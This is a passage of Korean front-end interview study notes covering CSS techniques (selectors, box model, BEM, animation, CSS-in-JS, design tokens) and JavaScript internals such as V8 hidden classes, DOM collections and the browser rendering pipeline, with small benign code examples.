- 이미지 스프라이트 기법

  이미지를 하나로 만든 뒤 position으로 이미지를 노출시키는 기법이다. 이미지 스프라이트 기법을 사용하면 트래픽이 절약되고 HTTP요청 횟수를 줄일 수 있다.

- image Lazy loading 기법

  페이지를 로드할 때, 모든 이미지를 로드하는 것이 아니라 중요하지 않은 자원 또는 당장 필요 없는 자원의 경우 서버에 요청을 미루고 필요한 경우 해당 자원을 요청 받는 기법이다. img 태그에 dateset 속성으로 url 저장 후 IntersectionObserver로 뷰포트 감지하여 뷰포트 내부에 이미지가 들어왔을 때 src 속성에 dateset 속성에 저장된 url을 할당하여 이미지 레이지 로딩을 적용시키는 방법과 img 태그에 loding 속성을 lazy로 설정하여 활용하는 방법 등으로 구현할 수 있다. 단, 이미지의 크기가 지정되어있어야 하고 페이지에서 가장 먼저 보이는 이미지는 사용하지 말아야한다. 또한 nextjs에서는 image 컴포넌트를 사용해 자동으로 이미지 레이지 로딩을 적용시킬 수 있다.

- image cdn 사용

  이미지 제공에 특화된 cdn을 사용한다. cdn은 이미지 제공 시 이미지를 줄이거나 포맷을 바꾸는 처리 과정을 통해 최적화 된 이미지를 제공한다. (ex AWS S3 + Cloudfront)

- nextjs 이미지 최적화 모듈 변경

  nextjs의 경우 이미지 최적화 모듈을 sqoosh에서 sharp로 변경해주는 것만으로도 이미지 최적화에 더욱 도움이 되는 것으로 알고 있다. -> 이미지 최적화 라이브러리인 sharp의 경우 next15 버전부터 자동으로 sharp를 사용하므로 수동으로 설치할 필요가 없다.

<br>

### # CSS의 attribute selector

- 속성 선택자로 요소 중 해당 속성을 가진 요소를 선택한다. 대괄호를 통해 속성을 지정할 수 있다.

  ```css
  a[href="https://velog.io"]
  {
    color: #ffffff;
  }
  ```

<br>

### # 박스형 모델

- 모든 HTML 요소는 박스 모양으로 구성되며, 이것을 박스형 모델이라고 한다. 박스형 모델은 margin, border, padding, content으로 구분된다. 구글 개발자 도구에서도 박스형 모델을 눈으로 확인해볼 수 있다. 이 박스형 모델의 크기는 box-sizing 속성을 통해 width, height 크기 적용의 기준을 변경할 수 있는데 기본 값은 content-box로 content 크기가 박스형 모델의 크기가 되고 border-box의 경우 border, padding, content 크기를 합한 크기가 박스형 모델의 크기가 된다. 즉 border와 padding을 계산하여 content 크기가 자동으로 줄어든다. 그렇기 때문에 대부분 정확한 박스 모델의 크기를 지정하기 위해 스타일 초기화 시 box-sizing: border-box를 적용시켜 지정한 width와 height가 그대로 박스형 모델 크기에 적용되도록 사용한다.

<br>

### # CSS 적용 우선순위

1. !important
2. 인라인
3. id
4. class
5. 태그이름(ex div)

<br>

### # 네이밍 설계 규칙 BEM 방식

- BEM은 Block, Element, Modifier를 뜻하며 이 세 가지를 활용하여 목적의 명확성, 재사용성, 클래스 충돌 방지를 위해 사용하는 규칙이다. `__`, `--`로 구분하며 재사용과 확장을 위해 id를 사용하지 않고 class만 사용한다. Block은 독립적으로 재사용 가능한 기본 단위 (ex button, card, form), Element는 Block 내부의 구성 요소 (ex `button__icon`, `form__label`),
  Modifier는 Block이나 Element의 변형/상태(ex `button--primary`, `form__label--error`)를 나타낸다.

  ```html
  <div class="card">
    <h2 class="card__title">제목</h2>
    <p class="card__description">설명</p>
    <button class="card__button card__button--primary">확인</button>
  </div>
  ```

<br>

### # Element 숨기는 방법

- opacity : 0

  뷰포트 내 박스 모델 O, 공간 차지 O, 클릭 가능 여부 O

- visibility : hidden

  뷰포트 내 박스 모델 O, 공간 차지 O, 클릭 가능 여부 X

- display : none

  뷰포트 내 박스 모델 X (DOM은 있음), 공간 차지 X, 클릭 가능 여부 X

### # CSS selector 동작원리

- 스타일 엔진이 선택자 가장 마지막에 있는 키 선택자부터 왼쪽으로 이동하면서 규칙에 부합하는지 검사하면서 파싱을 진행한다. 우측 우선 탐색 방식이다.

  ```css
  ul li a.button {
    color: red;
  }
  /*
    1. 먼저 모든 .button 클래스를 가진 요소를 찾고
    2. 그 부모가 <a>인지 확인
    3. 그 위 조상이 <li>인지 확인
    4. 다시 그 위 조상이 <ul>인지 확인
  */
  ```

<br>

### # CSS 결합자 종류

- 자손 결합자 (A B)

  A 요소의 자손인 B를 선택

- 자식 결합자 (A > B)

  A의 바로 아래 자식인 B를 선택

- 일반 형제 결합자 (A ~ B)

  A와 같은 부모를 가진 모든 형제 B를 선택

- 인접 형제 결합자 (A + B)

  A와 같은 부모를 가진 형제 요소 중 첫 번째 형제 요소 B만 선택

- 열 결합자 (A || B)

  A와 같은 열에 속하는 B를 선택, 일반적인 CSS에서는 거의 안 쓰임

<br>

### # CSS 크기 지정 종류

<br>

- 절대 값(absolute)

  px

- 상대 값(relative)

  rem(루트, 최상위 부모 요소 폰트 기준), em(직계 부모 요소 폰트 기준), vw(뷰포트 기준), vh(뷰포트 기준), %(부모 크기 기준)

<br>

### # CSS 애니메이션 vs JavaScript 애니메이션

- 적용 시기

  CSS 애니메이션은 비교적 작은 효과(크기 변경, 색상 변경 등)에 적합, JS 애니메이션은 세밀한 효과(바운스, 일시 중지 등)에 적합

- 호환성

  JS 애니메이션이 상대적으로 크로스 브라우징에 유리

- 실행 스레드

  CSS 애니메이션은 컴포지터 스레드에서 실행 되고, JS 애니메이션은 메인 스레드에서 실행 됨 (CSS가 효율적) 하지만 requestFrameAnimation을 활용하여 비동기로 애니메이션을 처리하여 효율적으로 프레임 타이밍에 맞춰 처리되기 때문에 렌더링 부하를 줄일 수 있다.

- GPU 가속

  GPU 가속이란 브라우저가 CSS나 애니메이션 등의 화면 렌더링 작업을 CPU(중앙 처리 장치)가 아닌 GPU(그래픽카드)에 맡기는 걸 말한다. CSS에서 `transform`, `opacity`, `will-change` 등의 속성은 GPU 가속이 적용된다. GPU 가속이 일어나는 특정 속성을 통해 layout이나 paint를 건너뛰고 바로 compositing 단계로 가기 때문에 성능을 향상 시킬 수 있다. 하지만 너무 많은 요소에 GPU 레이어를 적용하면 GPU 메모리 과부하 발생하여 오히려 성능 저하가 발생할 수 있다.

- GPU 가속 속성 예시

  - `transform`, `opacity`, `will-change`

  - `translate3d`, `scale`, `backface-visibility: hidden`, `perspective`

- CSS 애니메이션 관련 속성

  - animation + @keyframes (로딩, 아이콘 등에 적합)

  - transition (hover, 클릭 등에 적합)

  - requestAnimationFrame (성능 최적화로 고해상도 애니메이션에 적합)

  - JS 조작 (동적 제어 가능, 조건/이벤트 기반에 적합)

  - 라이브러리 (생산성이 높아 실무, 프로젝트에 적합)

<br>

### # 이미지 리플레이스먼트(Image Replacement)

- 이미지 리플레이스먼트(Image Replacement) 기법이란?

  이미지 리플레이스먼트(Image Replacement) 기법은 스크린 리더 사용자들을 위한, 이미지를 대신하는 대체 텍스트를 제공하는 기법으로 웹 접근성 준수하기 위해 사용하는 기법이다. img 태그에 alt과 같은 목적으로 사용한다. 만약 background-img와 같이 사용되는 경우 대체 텍스트가 없기 때문에 이미지 리플레이스먼트(Image Replacement) 기법을 통해 대체 텍스트를 제공해주어야한다. 단 스크린 리더 사용자들을 위한 텍스트이므로 일반 사용자들에게 보여지지 않도록 숨겨주어야한다. text-indent 속성을 활용한 방법, 추가 태그와 z-index 속성을 활용한 방법, clip 속성을 활용한 방법등이 있다. 주의할 점은 display none, 요소 크기 0, opacity 0 등의 방법은 스크린 리더가 읽을 수 없으므로 사용하지 않아야한다.

- 이미지 리플레이스먼트(Image Replacement) 기법 적용 방법 (텍제클)

  (1) text-indent 활용 : text-indent 속성(들여쓰기)을 -9999px로 주어 화면 밖으로 텍스트를 날리는 방법

  (2) z-index 활용 : 추가 태그(span)를 사용하고 position relative와 z-index -1로 설정하여 이미지 아래로 텍스트를 숨기는 방법

  (3) clip 속성 활용 : position을 absolute로 설정한 뒤 width와 height를 1px로 주고 화면 상 숨기기 위해 margin -1px을 설정하고 overflow hidden을 설정한다. 그 후 클리핑 범위를 0으로 설정하여 숨겨버린다.

<br>

### # CSS(Cascading Style Sheets)에서 Cascading에 의미

- 케스케이딩은 흐르는, 종속하는 의미를 가지고 있고 어떤 스타일로 브라우저에 표현할 지 결정해주는 시스템을 의미한다.
  케스케이딩 시스템을 사용하였을 때의 장점은 부모 요소의 스타일이 자식 요소에게 상속되는 점을 활용하여 부모 요소에 적절한 스타일을
  부여할 경우 되므로 코드의 양을 줄여 성능 향상에 기여할 수 있다. 일반적으로 박스 모델과 관련된 속성(margin, padding, border, witdh, height 등)은 상속되지 않고 폰트와 관련된 속성(color, font-family, font-size, text-align 등)들은 상속된다.
  기본적으로 상속되지 않는 속성을 상속하기 위해서 inherit 값을 사용할 수 있다.

<br>

### # root 선택자

- CSS의 :root속성을 통해 문서 트리의 루트 요소를 선택할 수 있다. HTML의 루트 요소는 `<html>`요소 선택자를 나타낸다. 다크 모드같은 경우 유용하게 사용할 수 있다.

  ```css
  /* :root에서 기본 색상 설정 (라이트 모드) */
  :root {
    --background-color: white;
    --text-color: black;
    --link-color: blue;
    --button-background: lightgray;
    --button-color: black;
  }
  ```

<br>

### # position 속성

- static : 기본 값이다. 차례대로 왼쪽에서 오른쪽, 위에서 아래로 쌓인다.

- relative : 자신의 위치를 기준으로 이동한다.

- absolute : 상위 요소의 relative를 기준으로 이동한다.

- fixed : 브라우저 창을 기준으로 스크롤 시 항상 고정된다.

- sticky : 부모 요소를 기준으로 스크롤 시 위치가 고정된다. 부모 요소의 특정 위치를 지나면 스크롤에 따라 고정이 해제되고, 다시 원래 문서 흐름으로 돌아간다.

<br>

### # image object-fit 속성

- none : 이미지의 크기를 조절하지 않으며 원본 이미지 크기 그대로 유지한다.

- fill : 이미지 비율 유지 x, 컨텐츠 박스 가로, 세로 크기에 딱 맞도록 이미지 크기를 조절한다.

- contain : 이미지 비율 유지 o, 컨텐츠 박스에 이미지가 모두 포함되도록 이미지 크기를 조절한다. 컨텐츠 박스와 비율이 일치하지 않으면 컨텐츠 박스 내부에 여백이 생긴다.

- cover : 이미지 비율 유지 o, 컨텐츠 박스 가로, 세로가 모두 차도록 이미지를 크기를 조절한다. 컨텐츠 박스와 비율이 일치하지 않으면 이미지가 잘릴 수 있다.

- scale-down : none과 contain 중 이미지 크기가 더 작아지는 값을 선택한다.

<br>

### # 사용했던 CSS 속성 순서 컨벤션

1. Layout Properties (position, float, clear, display)

2. Box Model Properties (width, height, margin, padding)

3. Visual Properties (color, background, border, box-shadow)

4. Typography Properties (font-size, font-family, text-align, text-transform)

5. Misc Properties (cursor, overflow, z-index)

<br>

### # Runtime CSS-in-JS vs Zero Runtime CSS-in-JS

- Runtime CSS-in-JS

  - 동작 방식

    런타임 시에 JavaScript를 통해 동적으로 스타일을 생성한다.

  - 대표 라이브러리

    styled-components, emotion

  - 장점

    - 동적 스타일링이 매우 자유롭다 (props/state 기반 스타일 적용 가능).

    - 스타일을 컴포넌트와 함께 작성하여 높은 응집도.

    - ThemeProvider 등으로 테마 관리가 용이하다.

    - HMR(Hot Module Replacement) 시 개발 경험이 부드럽다.

    - 고유한 className(hash)을 생성하여 CSS 충돌을 방지한다.

  - 단점

    - 스타일 생성 로직이 JS 번들에 포함되어 번들 사이즈가 커질 수 있다.

    - 런타임에 DOM에 스타일을 삽입해야 하므로 초기 렌더링 퍼포먼스가 저하될 수 있다.

    - SSR 시 빌드 도구 설정 변경과 같이 별도의 설정이 없으면 스타일 깜빡임 (FOUC(Flash of Unstyled Content)) 문제가 발생할 수 있다.

- Zero Runtime CSS-in-JS

  - 동작 방식

    빌드 타임에 JavaScript 코드를 파싱해 정적인 .css 파일을 생성한다.

  - 대표 라이브러리

    vanilla-extract, Linaria

  - 장점

    - 스타일 관련 JS 로직이 번들에서 제거되어 번들 사이즈를 줄일 수 있다.

    - CSS와 JS 번들을 병렬로 로딩하여 초기 렌더링 속도 및 퍼포먼스 (LCP, FCP 지표) 향상.

    - SSR 시 별도 설정 없이 안정적으로 스타일 적용 가능 (FOUC 문제 없음).

    - 정적 분석이 가능해 Dead Code Elimination(사용되지 않는 스타일 제거)이 용이하다.

  - 단점

    - Babel, Webpack 등의 빌드 설정을 추가로 커스터마이징해야 한다.

    - 동적 스타일링이 제한적이다. 다만 CSS 변수 활용, @vanilla-extract/dynamic 라이브러리 사용 등으로 일부 해결 가능

    - 구형 브라우저(IE 등)에서 CSS 변수 사용 제약으로 크로스 브라우징 이슈가 발생할 수 있다.

<br>

### # 디자인 토큰

디자인 토큰(Design Tokens)은 UI 디자인 시스템의 스타일 값들을 코드화한 재사용 가능한 단위이다. 쉽게 말해, 색상, 폰트, 여백, 그림자, 반응형 브레이크포인트 등의 디자인 속성에 이름을 붙여 변수처럼 사용하는 것이다.

- 디자인 토큰 적용 전 : 일반적인 CSS

  ```css
  .button {
    color: #ffffff;
    background-color: #007bff;
    padding: 8px 16px;
    border-radius: 4px;
  }
  ```

- 디자인 토큰 적용 후

  ```json
  {
    "color": {
      "primary": "#007bff",
      "text": "#ffffff"
    },
    "spacing": {
      "sm": "8px",
      "md": "16px"
    },
    "borderRadius": {
      "default": "4px"
    }
  }
  ```

  ```css
  .button {
    color: var(--color-text);
    background-color: var(--color-primary);
    padding: var(--spacing-sm) var(--spacing-md);
    border-radius: var(--borderRadius-default);
  }
  ```

<br><br><br>

## # Javascript

<br>

### # 프로그램 실행 과정

- 프로그램 실행 과정

  컴파일 -> 링크 -> 런타임

- 컴파일

  개발자가 작성한 소스코드를 기계어로 변환하는 과정, 컴파일 과정은 컴파일러에 의해 실행되는데 기계어로 변환된 파일은 목적 파일로 만들어진다.

- 링커

  컴파일 후 생성 된 목적 파일들을 합쳐서 하나의 실행 파일을 만들어주는 역할을 한다.

- 로더

  운영체제의 로더는 실행 파일을 로드 한 후 메모리에 적재하고 실행하는 역할을 한다.

  - 프로그램 실행 예시

    1. 프로그램은 처음엔 디스크에 저장되어 있는 상태입니다. (ex. 브라우저, Node.js 앱, 게임 등)

    2. 사용자가 프로그램을 실행하면 운영체제(OS)가 작동해서 실행 파일을 메모리(RAM)에 로드(올리고)하고 코드, 데이터, 스택, 힙 영역을 설정한다.

    3. 이때부터 CPU가 메모리에 적재된 명령어를 읽어 실행하면서 프로그램이 동작하게 된다.

- 런타임

  컴파일 과정을 마친 프로그램이 실행되고 있는 상태(혹은 실행되고 있는 때) 혹은 환경

- 빌드

  소스코드 파일을 실행 가능한 파일로 만드는 일련의 과정을 말한다.
  컴파일 -> 링크 절차가 빌드이다. 빌드가 완성 된 실행 가능한 파일을 사용자가 접근할 수 있는 환경에 배치시키는 것을 배포라고 한다.
  빌드 절차는 아래와 같다.

  1. 코드 작성

  2. 컴파일러가 소스 코드 분석 후(분석 시 문법 오류나 타입체크 에러 시 컴파일 에러 발생) 컴파일하여 0과 1로 이루어진 기계어로 변환하여 목적 파일 생성

  3. 링커가 목적 파일과 외부 라이브러리 등을 연결하여 사용자가 실행할 수 있는 실행 파일 생성

  4. 실행 파일 실행 시 운영체제의 로더를 통해 메인 메모리(RAM)에 적재되고 실행 됨

<br>

### # 컴파일러 vs 인터프리터

- 어셈블리어

  기계어와 일대일 대응이 되는 컴퓨터 프로그래밍의 저급 프로그래밍 언어이다. 기계어는 사람이 이해하기 어렵기 때문에 기계어를 사람이 이해할 수 있게 하기 위해 어셈블리어가 등장했다. 하지만 기계어는 CPU 제조사나 버전에 따라 다르기 때문에 그에 대응되는 어셈블리어도 각각 다르다는 문제가 발생했다. 이 때문에 통일된 언어체계로 작성한 코드의 필요성이 대두되고, 여기서 고급 프로그래밍 언어가 나오게 된다. 또한 고급 프로그래밍 언어를 CPU가 해석할 수 있는 기계어로 번역해주는 것이 컴파일러와 인터프리터이다.

- 컴파일러 인터프리터 차이

  | 특징      | 컴파일러                                       | 인터프리터                                   |
  | --------- | ---------------------------------------------- | -------------------------------------------- |
  | 번역 단위 | 전체 소스를 한 번에 기계어로 변환              | 소스를 한 줄씩 읽고 즉시 실행                |
  | 실행 속도 | 실행 속도 빠르다 (이미 기계어로 변환되어 있음) | 상대적으로 느리다 (실행 시 즉시 해석)        |
  | 실행 파일 | 실행 파일 생성됨 (예: .exe)                    | 생성되지 않음 (바로 실행됨)                  |
  | 에러 발생 | 전체 코드 분석 후 에러 보고                    | 에러가 발생하면 그 이후 코드는 실행되지 않음 |
  | 대표 언어 | C, C++, Go (Java는 컴파일 + JVM 실행) 등       | Python, Ruby, 전통적인 JS 등                 |

- 자바스크립트는 컴파일러일까 인터프리터일까?

  자바스크립트는 원래 인터프리터 언어로 출발했지만 유저 인터렉션이 점점 늘어나고 애플리케이션의 구조가 커지게 되며 실행 속도를 빠르게 개선하기 위해 V8엔진이 등장했고 V8엔진은 JITC(Just In Time Compiler)인 터보팬(TurboFan)과 이그니션 인터프리터(Ignition)를 함께 사용하는 하이브리드 방식으로 동작한다. V8엔진은 반복 수행 정도에 따라 유동적으로 다른 최적화 방식을 사용하여 실행 속도를 높인다.

### # 구글 크롬 Javascript V8엔진의 JITC(Just In Time Compiler)

- V8엔진의 JITC(Just In Time Compiler)

  1. 자바스크립트 엔진 V8엔진에 JS 파일(JS 코드)을 넘긴다.

  2. 파서가 소스 코드를 분석하여 추상 구문 트리(AST) 생성한다.

  3. 이그니션(Ignition) 인터프리터가 추상 구문 트리(AST)를 바이트 코드(중간 코드)로 변환하고 실행한다.

  4. 실행 과정 중 프로파일러가 프로파일링을 통해 자주 반복 실행되는 과열 지점(hot spot)을 찾는다.

  5. 과열 지점(hot spot)을 찾게 되면 해당 코드를 터보팬 컴파일러(TurboFan)으로 전달되어 최적화된 기계어로 컴파일한다.

<br>

### # v8 엔진의 히든 클래스

- v8 엔진의 히든 클래스

  - v8 엔진은 c++로 작성되어 오픈소스로 공개되어 있다.

  - 크롬, nodejs에서 사용하는 자바스트립트 엔진이다.

  - 자바스크립트는 동적 타이핑 언어로 정적 타이핑 언어에 비해 객체 프로퍼티에 접근하는 속도가 느려질 수 있다. 그렇기 때문에 히든 클래스를 통해 객체 프로퍼티 접근 속도를 향상시켰다.

- 히든 클래스 특징

  - 객체는 반드시 하나의 히든 클래스를 참조한다.

  - 히든 클래스는 각 프로퍼티에 대해 메모리 오프셋을 가지고 있다.

  - 동적으로 새로운 프로퍼티가 만들어질 때, 혹은 기존 프로퍼티가 삭제되거나 기존 프로퍼티의 데이터 타입이 바뀔 때는 신규 히든 클래스가 생성되며, 신규 히든 클래스는 기존 프로퍼티에 대한 정보를 유지하면서 추가적으로 새 프로퍼티의 오프셋을 가지게 된다.

  - 히든 클래스는 프로퍼티에 대해 변경이 발생했을 때 참조해야 하는 히든 클래스에 대한 정보를 갖는다.

  - 객체에 새로운 프로퍼티가 만들어지면, 현재 참조하고 있는 히든 클래스의 전환 정보를 확인한 후, 현재 프로퍼티에 대한 변경이 전환 정보의 조건과 일치하면, 객체의 참조 히든 클래스를 조건에 명시된 히든 클래스로 변경시킨다.

- 히든 클래스의 실제 활용 방법

  - 1. 객체를 일관된 방식으로 초기화하라

    ```javascript
    // 나쁨 (동적으로 프로퍼티 추가)
    function makeUserBad() {
      const user = {};
      user.name = "Alice";
      user.age = 30;
      return user;
    }

    // 좋음 (생성 시점에 한 번에 정의)
    function makeUserGood() {
      return {
        name: "Alice",
        age: 30,
      };
    }

    // → 이렇게 하면 V8은 makeUserGood이 반환하는 모든 객체에 대해 같은 히든 클래스를 재사용할 수 있어.
    ```

  - 2. 객체에 프로퍼티를 동적으로 추가하지 말 것

    ```javascript
    const obj = { x: 1 };
    obj.y = 2; // 런타임에 추가됨 → 히든 클래스가 변경됨 → 성능 저하

    // → 가능한 한 초기화 시점에 필요한 모든 프로퍼티를 다 선언하는 게 좋아.
    ```

  - 3. 프로퍼티 추가 순서를 일관되게 유지하라

    ```javascript
    // 히든 클래스가 다르게 만들어짐
    const a = { x: 1, y: 2 };
    const b = { y: 2, x: 1 }; // 순서가 다르면 V8이 다른 히든 클래스로 인식할 수 있음

    // → 초기화 순서도 가능하면 일관되게 유지하는 게 좋아.
    ```

  - 4. 삭제는 하지 말것

    ```javascript
    const obj = { x: 1, y: 2 };
    delete obj.y; // 히든 클래스가 바뀌어서 인라인 캐시 무효화됨

    // → delete 연산은 성능 최적화에 악영향을 줘. 될 수 있으면 사용하지 말 것.
    ```

  - 5. 배열도 조심하라

    ```javascript
    // 배열도 비슷한 최적화가 있는데, 다음은 성능 저하 원인이 될 수 있다:

    // 희소 배열(sparse array)
    const arr = [];
    arr[10000] = 1; // 중간이 비어 있는 배열 → 빠른 배열에서 일반 객체 배열로 퇴화

    // 배열에 다양한 타입 섞기
    const arr = [1, 2, "three"]; // 타입 혼합 → 타입 안정성 깨짐 → 성능 하락
    ```

- 인라인 캐시

  - 자바스크립트에서 객체의 프로퍼티를 읽거나 쓸 때, 최근 접근한 정보(예: 프로퍼티 위치, 히든 클래스 등)를 캐시에 저장해 두고 다음 접근을 빠르게 처리하는 기술이야.

  - 인라인 캐시는 자바스크립트 객체의 프로퍼티 접근을 빠르게 만든다.

  - 같은 구조(히든 클래스)를 계속 사용하면 이 캐시가 잘 작동해서 성능이 매우 좋아져.

  - 다른 구조가 섞이면 캐시가 무효화되고 성능이 떨어짐.

<br>

### # 바이너리 코드, 기계어, 바이트 코드

- 바이너리 코드

  바이너리 코드는 컴퓨터(CPU)가 인식할 수 있는 0과 1로 구성된 이진코드 혹은 데이터, 0과 1로 이루어진 여러 비트가 모여서 만든 코드

- 기계어

  1. 기계어는 0과 1로 이루어진 바이너리 코드이다.

  2. 기계어는 특정한 언어가 아니다. 단지 CPU 제조사에서 CPU를 만들 때 해당 CPU에서 사용하는 명령어 집합을 공개하는데, 이것을 기계어라고 부를 뿐이다. 그렇기 때문에 CPU가 변경되면 기계어가 달라진다.

  3. 같은 회사의 CPU라도 버전 별로 다른 명령을 포함할 수 있으며 다른 회사라도 같은 명령어 집합을 공유할 수도 있다.

  4. 기계어가 이진코드로 이루어졌을 뿐이지 모든 이진코드가 기계어인 것은 아니다. (바이너리 코드 != 기계어) 바이너리 코드는 데이터일뿐, CPU에서 실행되기 위해서는 해당 CPU 아키텍처에 맞는 기계어야 실행할 수 있다.

- 바이트 코드

  1. CPU가 이해할 수 있는 언어가 기계어라면, 바이트 코드는 가상 머신이 이해할 수 있는 0과 1로 이루어진 이진코드

  2. 바이트 코드는 고급 언어로 작성된 소스 코드를 가상 머신이 처리할 수 있는 형태로 변환한 것이다. 예를 들어, Java는 중간 코드인 바이트 코드로 컴파일되어 JVM에서 실행된다. 이는 하드웨어 종속성이 없고 가상 머신만 있으면 다양한 플랫폼에서 실행할 수 있다.

<br>

### # window 객체

- window 객체는 호스트 객체로서 웹 브라우저에서 브라우저 창을 나타내는 객체이다. 또 최상위 객체이기 때문에 전역 객체라고도 하며 자바스크립트의 모든 객체, 전역 함수, 전역 변수들은 자동으로 window 객체의 프로퍼티가 된다. window 객체는 브라우저 환경에서만 존재하며 Node.js와 같은 다른 자바스크립트 환경에서는 window 객체가 존재하지 않는다.

  ```js
  var x = 10;
  console.log(window.x); // 10
  ```

<br>

### # 선택자 메소드 종류

- getElementById

  주어진 id 속성 값을 가진 요소를 선택, 리턴 값은 HTMLElement 객체

  ```js
  document.getElementById("username");
  ```

- getElementsByClassName

  주어진 클래스 이름을 가진 모든 요소를 선택, 리턴 값은 HTMLCollection 객체

  ```js
  document.getElementsByClassName("input");
  ```

- querySelector

  CSS 선택자를 사용하여 첫 번째 요소를 반환, 리턴 값은 Element 객체

  ```js
  document.querySelector("#userForm #username");
  ```

- querySelectorAll

  CSS 선택자를 사용하여 모든 일치하는 요소를 선택, 리턴 값은 NodeList 객체

  ```js
  document.querySelectorAll("#userForm #username");
  ```

<br>

### # Node, Element, HTMLCollection, NodeList

- Node 객체

  DOM API상에 존재하는 모든 것들이 Node 객체이다. 문서 노드(document node), 요소 노드(element node), 속성 노드(attribute node),
  텍스트 노드(text node), 주석 노드(comment node) 등이 있다. 특정 Node를 지정하는 것은 특정 태그 노드와 그 내부에 텍스트 노드 전체를 가리키는 것이다.
  (`ex) <a>하이</a>의 경우 'a' 태그 노드안에 '하이' 텍스트 노드`)

- Element 객체

  Element는 Node의 자식으로 노드 타입 중 하나로 요소 노드 타입이다. 속성 노드(`ex href`)를 가질 수 있는 유일한 노드이다.
  HTMLElement는 Element의 자식이고 Element는 Node의 자식이다. Node는 Object의 자식이다. 이러한 관계를 DOM Tree라고 한다. 특정 Element를 지정하는 것은 텍스트 노드를 제외하고, 흔히 생각하는 태그만 가리키는 것이다. (`ex) <a>하이</a>의 경우 'a' 태그`)

- HTMLCollection 객체

  Element들의 컬렉션, Live 객체(노드 변경 반영 O, 동적 상태), 예를 들어 3개의 li를 생성해놓고 이 li를 HTMLCollection를 반환하는 getElementsByClassName로 선택 후 for 반복문을 통해 색상을 변경하려고 할 때 첫번째, 세번째 li만 색상이 바뀐다.
  이유는 첫번째 루프에서 index 0의 li가 색상이 변하고 실시간으로 노드 변경이 반영되어 HTMLCollection은 두 개의 li만 남게 된다.
  이 때 반복문은 두번째 루프로 index 1의 li 색상이 변경되는 것이다. 그렇기 때문에 최종적으로 첫번째, 세번째 li만 색상이 바뀐다.

  ```html
  <body>
    <ul id="fruits">
      <li class="red">Apple</li>
      <li class="red">Banana</li>
      <li class="red">Orange</li>
    </ul>
    <script>
      const $fruits = document.getElementsByClassName("red");
      for (let i = 0; i < $fruits.length; i++) {
        // li 요소들의 클래스명을 blue로 변경, 첫번째 세번째 li의 클래스가 blue로 변경된다.
        $fruits[i].className = "blue";
      }
    </script>
  </body>
  ```

- NodeList 객체

  Node들의 컬렉션, 대부분 Non-Live 객체(노드 변경 반영 X, 정적 상태), 예를 들어 3개의 li를 생성해놓고 이 li를 NodeList를 반환하는
  querySelectorAll로 선택 후 for 반복문을 통해 색상을 변경하려고 할 때 전체 li 색상이 바뀐다. 이유는 HTMLCollection과 달리 정적 상태를
  유지하므로 중간에 요소의 상태가 바뀌어도 실시간으로 반영되지 않기 때문이다. 하지만 childNodes 프로퍼티가 반환하는 NodeList 객체는
  HTMLCollection 객체와 같이 실시간으로 노드 객체의 상태 변경을 반영하는 live 객체로 동작하므로 주의해야한다.

  ```html
  <body>
    <ul id="fruits">
      <li class="red">Apple</li>
      <li class="red">Banana</li>
      <li class="red">Orange</li>
    </ul>
    <script>
      const $fruits = document.querySelectorAll(".red");
      // li 요소들의 클래스명을 blue로 변경, 전체 li의 클래스가 blue로 변경된다.
      for (let i = 0; i < $fruits.length; i++) {
        $fruits[i].className = "blue";
      }
    </script>
  </body>
  ```

<br>

### # 크로스 브라우징

- 크로스 브라우징이란?

  브라우저마다 렌더링 엔진이 다르기 때문에 렌더링 되는 결과물에 차이가 있을 수 있는데 이 때 모든 브라우저에서 화면을 동일하게 보이게 하는 것이 아닌 모든 브라우저에서 동등한 수준의 정보, 기능 제공을 할 수 있도록 하는 것을 목표로 하는 방법론

- 크로스 브라우징 대응 방법 예시

  1. 타깃 설정 : 모든 브라우저 대응이 어려운 경우 구글 어낼리틱스나 navigator 객체의 userAgent를 통해 서비스를 사용하는 사용자의 기기를 확인 후 많은 점유를 차지하는 기기 순서대로 대응하였다.

  2. 호환성 확인 : 메소드, 스타일 속성 사용 시 Can I Use와 같은 사이트를 통해 브라우저 호환성 체크

  3. 바벨 사용 : 바벨의 플러그인이나 프리셋을 활용하여 자바스크립트 최신 문법을 하위 문법으로 트랜스파일링한다.

  4. 스타일 초기화 : 프로젝트 세팅 시 브라우저 마다 차이가 있는 기본 스타일 값을 초기화 시켰다. reset 파일 내부에서 태그별 기본 margin, padding, border 등을 제거해주거나 list-style 혹은 line-height 등을 기본 값으로 할당한다.

  5. CSS 벤더 프리픽스 사용 (`ex -webkit-display: flex, -moz-display: flex`) : 벤더 프리픽스를 활용하였다.

  6. 폴리필 사용 : 지원하지 않는 메소드의 경우 폴리필 코드를 통해 메소드를 직접 추가한다.

  7. 컨디셔널 코멘트(Conditional Comments) 사용 (`ex <!--[if IE 9 | !IE]>`) : HTML 문서 내에 IE 용 주석을 이용한 방법으로 IE 사용자가 접근하지 못하도록 막았었다.

<br>

### # 브라우저 렌더링 원리

0. 리소스 요청 및 응답 : 사용자가 웹 페이지 접근 시 해당 페이지에 관한 리소스(HTML, CSS, Javascript, 이미지 파일 등)를 서버에 요청 후 응답 받은 뒤 렌더링 진행

1. Parsing : 렌더링 엔진의 HTML 파서가 HTML 파싱하여 DOM(Document Object Model) 트리 생성,
   CSS 파서가 CSS 파싱하여 CSSOM(Css Object Model) 트리 생성

2. Style : 두 트리를 결합하여 렌더 트리 생성

3. Layout/Reflow : 렌더 트리에서 각 노드의 위치와 크기 등 레이아웃 값을 계산한다.

4. Paint/Repaint : 계산된 레이아웃 값을 이용해 각 노드를 화면상의 실제 픽셀로 변환하고, 레이어를 만든다. 레이어가 분리되는 경우는 아래와 같다.

- overflow scroll, auto를 통해 스크롤되는 요소

- position fixed, sticky가 적용되어 있는 요소

- will-change 속성이 적용되어 있는 요소

- `<video>`, `<iframe>`, `<img>` 태그로 로드된 미디어 요소

5. Composite : 레이어를 합성하여 실제 화면에 나타낸다.

6. Javascript : 자바스크립트는 렌더링 엔진이 아닌 자바스크립트 엔진이 처리한다. 자바스크립트 엔진은 자바스크립트 파일을 로드하고 파싱하여 실행하는데
   이 때 정적인 DOM에 javascript가 바인딩되어 하이드레이션이 발생하고 사용자 상호 작용이 가능해진다.

7. Reflow/Repaint : 렌더링 과정을 거친 뒤에 최종적으로 페이지가 그려진다고 해서 렌더링 과정이 다 끝난것이 아니다.
   어떠한 액션이나 이벤트에 따라 html 요소의 크기나 위치 등이 변경되면 그에 영향을 받는 자식 노드나 부모 노드들을 포함하여 Layout 과정을 다시 수행하게 된다.
   이렇게 되면 Render Tree와 각 요소들의 크기와 위치를 다시 계산하게 된다. 이러한 과정을 Reflow라고 한다.
